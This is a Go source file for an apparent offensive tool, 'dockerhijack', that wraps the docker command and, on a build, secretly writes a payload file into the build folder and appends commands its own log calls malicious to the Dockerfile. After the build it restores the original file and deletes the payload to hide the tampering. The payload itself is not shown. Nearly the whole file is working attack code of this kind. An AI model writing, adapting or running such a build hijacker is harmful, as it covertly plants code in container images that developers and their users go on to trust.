package dockerhijack

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const ExitSuccess = 0

var originalFilePath string
var originalFileBytes []byte
var backupFilePath string

func ProxyDockerArgs(osArgs []string) int {

	if isDockerBuildCmd(osArgs) {
		DoHijack(osArgs)
	} else {
		invokeDocker(osArgs)
	}

	return ExitSuccess
}

func DoHijack(osArgs []string) {

	var err error

	// get the build file path from args
	buildFilePath := ExtractBuildFileFromArgs(osArgs)

	// backup the original build file
	originalFileBytes, err = os.ReadFile(buildFilePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, err.Error())
		return
	}
	backupBuildFile(originalFileBytes)

	InjectBuildFile(osArgs)

	invokeDocker(osArgs)

	RestoreBuildFile(osArgs, originalFileBytes)

	os.Remove(PAYLOAD_NAME)

}

func RestoreBuildFile(osArgs []string, data []byte) error {
	buildFilePath := ExtractBuildFileFromArgs(osArgs)

	err := os.WriteFile(buildFilePath, data, 0644) // TODO: use original file's chmod perms

	if err != nil {
		return err
	}
	return nil
}

func backupBuildFile(data []byte) error {

	f, err := os.CreateTemp("", "")
	if err != nil {
		return err
	}
	defer f.Close()

	log.Println("Backing up original build file to: ", f.Name())

	_, err = f.Write(data)
	if err != nil {
		return err
	}

	backupFilePath = f.Name()

	return nil

}

func InjectBuildFile(osArgs []string) {

	// write payload to current folder
	err := os.WriteFile(PAYLOAD_NAME, payload, 0744)
	if err != nil {
		log.Fatal(err)
	}
	pwd, _ := os.Getwd()
	log.Println("wrote payload to: ", filepath.Join(pwd, PAYLOAD_NAME))

	// append malicious commands to original build file
	fp, err := os.OpenFile(originalFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer fp.Close()

	log.Println("inserting malicious commands into build file")
	_, err = fp.WriteString(string(installPayload))
	if err != nil {
		log.Fatal(err)
	}

}

func invokeDocker(args []string) {

	// repalce docker-hijack with legit docker executable
	args[0] = GetRealDockerPath()

	dockerArgs := strings.Join(args, " ")

	c := exec.Command("sh", "-c", dockerArgs)

	out, err := c.CombinedOutput()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	}

	fmt.Println(string(out))
}

// TODO: find legit docker, write its path to the embedded filesystem
// TODO: read the legit docker from the path

func GetRealDockerPath() string {
	// TODO - update this, shouldn't be hard coded
	// this should read from an embedded file
	return "/usr/bin/docker"
}

func isDockerBuildCmd(array []string) bool {
	for _, s := range array {
		if s == "build" {
			return true
		}
	}
	return false
}

func ExtractBuildFileFromArgs(args []string) string {

	for _, eachArg := range args {
		if eachArg == "." {
			originalFilePath = "Dockerfile"
			return "Dockerfile"
		}

		if strings.Contains(eachArg, "Dockerfile") {
			originalFilePath = eachArg
			return eachArg
		}
	}
	return ""
}
